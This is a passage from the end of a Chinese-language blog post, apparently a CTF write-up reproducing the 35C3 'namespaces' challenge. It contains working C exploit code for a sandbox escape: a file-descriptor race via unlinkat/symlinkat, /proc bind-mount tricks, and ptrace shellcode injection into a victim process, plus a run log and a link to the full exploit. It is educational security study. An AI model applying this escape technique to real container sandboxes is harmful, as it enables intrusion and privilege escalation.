class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_recvfd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = setup_socket_and_recv_fd();</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Starting race&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (unlinkat(fd, <span class="string">&quot;../2&quot;</span>, AT_REMOVEDIR))</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    CHECK_CALL(symlinkat, <span class="string">&quot;/&quot;</span>, fd, <span class="string">&quot;../2&quot;</span>);</span><br><span class="line">    info(<span class="string">&quot;Race done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">setup_socket_and_recv_fd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> addrlen;</span><br><span class="line">    create_socket(&amp;sock, &amp;addr, &amp;addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Connecting&quot;</span>);</span><br><span class="line">    <span class="type">int</span> conn = CHECK_CALL(connect, sock, &amp;addr, addrlen);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = recv_fd(conn);</span><br><span class="line"></span><br><span class="line">    close(conn);</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">recv_fd</span><span class="params">(<span class="type">int</span> conn)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Preparing for receive&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> io_buf[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span> =</span> &#123;.iov_base = io_buf, .iov_len = <span class="keyword">sizeof</span> io_buf&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> buf[CMSG_SPACE(<span class="keyword">sizeof</span> fd)];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> <span class="title">align</span>;</span></span><br><span class="line">    &#125; u;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;u, <span class="number">0</span>, <span class="keyword">sizeof</span> u);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    msg.msg_iov = &amp;io;</span><br><span class="line">    msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">    msg.msg_control = u.buf;</span><br><span class="line">    msg.msg_controllen = <span class="keyword">sizeof</span> u.buf;</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Receiving fd&quot;</span>);</span><br><span class="line">    CHECK_CALL(recvmsg, conn, &amp;msg, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Extracting fd&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmsghdr</span> *<span class="title">cmsg</span> =</span> CMSG_FIRSTHDR(&amp;msg);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsg), <span class="keyword">sizeof</span> fd);</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后便是最重要的逃逸部分代码，这里只放一些关键代码，首先先检测是否可以访问&#x2F;proc文件夹，也就是看一下是否逃逸成功到&#x2F;目录，之后创建子进程，并且通过set_trap_for_join来进行mnt操作，首先就是把proc放到一个新的目录下，并且创建一个新的&#x2F;proc目录，让新的&#x2F;proc&#x2F;父进程pid&#x2F;ns&#x2F;pid指向原来子进程的pid namespace，这样后面run_elf的时候就会和子进程一个pid namespace了，之后就是把uts namespace创建成fifo用来阻塞，提高成功率，之后就是不断的利用ptrace进行检测是否有新的进程加入，这里需要注意的是因为创建的是一个新进程，所以这里直接检测pid为2就可以了，之后注入shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_escalate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Checking that we won the race&quot;</span>);</span><br><span class="line">    CHECK_CALL(access, <span class="string">&quot;/proc&quot;</span>, F_OK);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> init = get_cur_pid();</span><br><span class="line">    info(<span class="string">&quot;Init pid: %d&quot;</span>, init);</span><br><span class="line">    </span><br><span class="line">    new_namespaces();</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Forking&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (CHECK_CALL(fork)) &#123;</span><br><span class="line">        info(<span class="string">&quot;Parent done&quot;</span>);</span><br><span class="line">        do_sleep();</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;Child started&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> child = get_cur_pid();</span><br><span class="line">    info(<span class="string">&quot;Child pid: %d&quot;</span>, child);</span><br><span class="line">    </span><br><span class="line">    set_trap_for_join(init, child);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Waiting for victim to join&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (ptrace(PTRACE_ATTACH, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;Attached to victim&quot;</span>);</span><br><span class="line">    CHECK_CALL(waitpid, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Reading rip&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    xptrace(PTRACE_GETREGS, <span class="number">2</span>, <span class="number">0</span>, (<span class="type">uintptr_t</span>)&amp;regs);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Writing shellcode to %p&quot;</span>, regs.rip);</span><br><span class="line">    <span class="type">uint8_t</span> shellcode[] = &#123;SHELLCODE&#125;;</span><br><span class="line">    ptrace_write(<span class="number">2</span>, regs.rip, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Detaching&quot;</span>);</span><br><span class="line">    xptrace(PTRACE_DETACH, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Opening fifo&quot;</span>);</span><br><span class="line">    DECL_STR(fifo, <span class="string">&quot;/proc/%d/ns/uts&quot;</span>, init)</span><br><span class="line">    CHECK_CALL(open, fifo, O_WRONLY);</span><br><span class="line">    </span><br><span class="line">    do_sleep();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_trap_for_join</span><span class="params">(<span class="type">int</span> init_pid, <span class="type">int</span> child_pid)</span> &#123;</span><br><span class="line">    makedir(<span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND));</span><br><span class="line">    bindmount(<span class="string">&quot;/proc&quot;</span>, <span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND));</span><br><span class="line">    makedir(<span class="string">&quot;/tmp/newproc_&quot;</span> STR(RAND));</span><br><span class="line">    bindmount(<span class="string">&quot;/tmp/newproc_&quot;</span> STR(RAND), <span class="string">&quot;/proc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DECL_STR(dir1, <span class="string">&quot;/proc/%d&quot;</span>, init_pid)</span><br><span class="line">    makedir(dir1);</span><br><span class="line">    DECL_STR(dir2, <span class="string">&quot;/proc/%d/ns&quot;</span>, init_pid)</span><br><span class="line">    makedir(dir2);</span><br><span class="line"></span><br><span class="line">    DECL_STR(linkpath, <span class="string">&quot;/proc/%d/ns/pid&quot;</span>, init_pid)</span><br><span class="line">    DECL_STR(target, <span class="string">&quot;/tmp/oldproc_&quot;</span> STR(RAND) <span class="string">&quot;/%d/ns/pid&quot;</span>, child_pid)</span><br><span class="line">    info(<span class="string">&quot;Linking pid ns \&quot;%s\&quot; -&gt; \&quot;%s\&quot;&quot;</span>, linkpath, target);</span><br><span class="line">    CHECK_CALL(symlink, target, linkpath);</span><br><span class="line"></span><br><span class="line">    DECL_STR(fifo, <span class="string">&quot;/proc/%d/ns/uts&quot;</span>, init_pid)</span><br><span class="line">    info(<span class="string">&quot;Creating fifo \&quot;%s\&quot;&quot;</span>, fifo);</span><br><span class="line">    CHECK_CALL(mkfifo, fifo, <span class="number">0755</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	自此代码的逻辑就分析完了，这里贴一下简单的执行流程，根据这个流程执行最终就会把sandbox2的进程读取flag并且输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting sandbox: sleep</span><br><span class="line">[+] Starting sandbox: sleep</span><br><span class="line">[+] Running in sandbox #0: sendfd</span><br><span class="line">[+] Running in sandbox #1: recvfd</span><br><span class="line">[+] Starting sandbox: escalate</span><br><span class="line">[+] Running in sandbox #2: sleep</span><br></pre></td></tr></table></figure>

<p>​	由于篇幅原因，需要exp的可以直接访问<a target="_blank" rel="noopener" href="https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces">链接</a>来进行获取</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	由于这个是我复现的容器逃逸的第一个题目，其中很多思想之前并没有接触过，因此复现的过程也比较详细，中间也踩过不少的坑，通过这个文章可以很清楚的复现对应赛题，感觉通过这个题目对于容器有了进一步的了解，希望可以通过后面的学习不断的加深对于容器以及docker原理的学习和漏洞复现</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">a2ure</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">a2ure</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
